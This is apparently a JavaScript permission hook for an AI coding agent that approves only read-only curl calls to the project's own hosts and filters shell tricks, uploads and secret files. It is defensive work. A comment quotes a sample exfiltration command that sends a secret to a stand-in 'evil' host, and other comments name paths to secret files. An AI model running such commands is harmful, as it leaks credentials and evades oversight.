// PreToolUse (Bash) hook: approves a read-only `curl` against the project's own hosts, so the qa
// agents, which run in the background, can check headers, compression, caching and the audio
// Worker without a permission prompt per call. A wildcard allow rule cannot do this safely:
// `Bash(curl -s* https://site*)` also matched `curl -s -d @secret https://evil https://site`.
//
// Approved only when every token is understood: plain `curl`, no shell operators or expansions,
// flags from a read-only list (no upload, no output file except /dev/null, no redirect following,
// no config file), and every URL on a host from ALLOWED_ORIGINS in worker/wrangler.jsonc or the
// audio Worker in scripts/sync-music/config.ts. Anything else gets no answer, and the normal
// permission rules decide. The secrets guard runs too, and its deny wins over this allow.
import { readFileSync } from 'node:fs';
import { join } from 'node:path';

import {
  projectDir,
  readHookInput,
  writeHookOutput,
} from './lib/read-hook-input.mjs';

const readProjectFile = (relativePath) => {
  try {
    return readFileSync(join(projectDir, relativePath), 'utf8');
  } catch {
    return '';
  }
};

const getAllowedHosts = () => {
  const origins =
    readProjectFile('worker/wrangler.jsonc')
      .match(/"ALLOWED_ORIGINS"\s*:\s*"([^"]*)"/)?.[1]
      ?.split(',') ?? [];
  const audioBaseUrl = readProjectFile('scripts/sync-music/config.ts').match(
    /audioBaseUrl\s*=\s*'([^']+)'/
  )?.[1];
  return new Set(
    [...origins, audioBaseUrl ?? '']
      .map((origin) => origin.trim())
      .filter((origin) => /^https?:\/\/[\w.-]+(:\d+)?$/.test(origin))
      .map((origin) => new URL(origin).host)
  );
};

// Splits like a POSIX shell for the subset approved here: single and double quotes, no escapes
// outside them. Returns null on anything the shell would treat specially (operators, expansions,
// globs, redirects, a backslash, a line break), so such a command is never approved.
const tokenize = (command) => {
  const tokens = [];
  let current = null;
  let quote = null;
  for (const char of command) {
    if (quote) {
      if (char === quote) quote = null;
      else if (char === '\n' || char === '\r') return null;
      else if (quote === '"' && /[$`\\!]/.test(char)) return null;
      else current += char;
    } else if (char === "'" || char === '"') {
      quote = char;
      current ??= '';
    } else if (char === '\n' || char === '\r') {
      return null;
    } else if (/\s/.test(char)) {
      if (current !== null) tokens.push(current);
      current = null;
    } else if (/[;&|<>`$()*?[\]{}\\~#!]/.test(char)) {
      return null;
    } else {
      current = (current ?? '') + char;
    }
  }
  if (quote) return null;
  if (current !== null) tokens.push(current);
  return tokens;
};

const allowedHeader =
  /^(Accept-Encoding|Accept|Origin|Range|Cache-Control):[ \t]*[\w \t.,:/=*;+-]*$/i;
// `-w @file` prints a local file and `%output{file}` (curl 8.3+) writes one: only literal text, `\n`
// and `%{variable}` placeholders pass.
const isWriteOutFormat = (value) =>
  /^(?:%\{[a-z_]+\}|\\n|[\w \t:./,=()-])+$/.test(value) &&
  !value.startsWith('@');
const isSeconds = (value) => /^\d{1,3}$/.test(value);
const flagsWithValue = {
  '-o': (value) => value === '/dev/null',
  '--output': (value) => value === '/dev/null',
  '-w': isWriteOutFormat,
  '--write-out': isWriteOutFormat,
  '-D': (value) => value === '-',
  '--dump-header': (value) => value === '-',
  '-H': (value) => allowedHeader.test(value),
  '--header': (value) => allowedHeader.test(value),
  '-X': (value) => value === 'GET' || value === 'HEAD',
  '--request': (value) => value === 'GET' || value === 'HEAD',
  '-m': isSeconds,
  '--max-time': isSeconds,
};
const standaloneFlags = new Set([
  '--silent',
  '--show-error',
  '--head',
  '--include',
  '--compressed',
  '--verbose',
]);
const shortFlagGroup = /^-[sSIiv]+$/;
const localHost = /^(localhost|127\.0\.0\.1)(:\d+)?$/;

// A local dev server serves project files by path, so on localhost only plain paths pass: no
// percent-encoding (`/%2Edev.vars`) and no dot-segment (`/.git/config`, `/worker/.dev.vars`).
const isSafePath = (url) =>
  !localHost.test(url.host) ||
  (!url.pathname.includes('%') && !/\/\./.test(url.pathname));

const isApprovedCurl = (command, allowedHosts) => {
  const tokens = tokenize(command.trim());
  if (!tokens || tokens[0] !== 'curl') return false;
  // Quote-split names (`.en''v`) join here, after the secrets guard has read the raw text.
  if (
    tokens.some((token) =>
      /\.env|\.dev\.vars|@/i.test(token.replace(/^https?:\/\/[^/]*/, ''))
    )
  )
    return false;
  let urlCount = 0;
  for (let i = 1; i < tokens.length; i += 1) {
    const token = tokens[i];
    if (Object.hasOwn(flagsWithValue, token)) {
      const value = tokens[i + 1];
      if (value === undefined || !flagsWithValue[token](value)) return false;
      i += 1;
    } else if (standaloneFlags.has(token) || shortFlagGroup.test(token)) {
      continue;
    } else if (/^https?:\/\//.test(token)) {
      // curl expands `[1-100000]` and `{a,b}` into many requests; `~` spells 8.3 short names.
      if (/[[\]{}~]/.test(token)) return false;
      let url;
      try {
        url = new URL(token);
      } catch {
        return false;
      }
      if (
        url.username ||
        url.password ||
        !allowedHosts.has(url.host) ||
        !isSafePath(url)
      )
        return false;
      urlCount += 1;
    } else {
      return false;
    }
  }
  return urlCount > 0;
};

const input = await readHookInput();
const command = input?.tool_input?.command;
if (typeof command !== 'string' || !/^\s*curl\s/.test(command)) process.exit(0);
if (!isApprovedCurl(command, getAllowedHosts())) process.exit(0);

await writeHookOutput({
  hookSpecificOutput: {
    hookEventName: 'PreToolUse',
    permissionDecision: 'allow',
    permissionDecisionReason:
      'Read-only curl against the site or its audio Worker (pre-curl-allow).',
  },
});
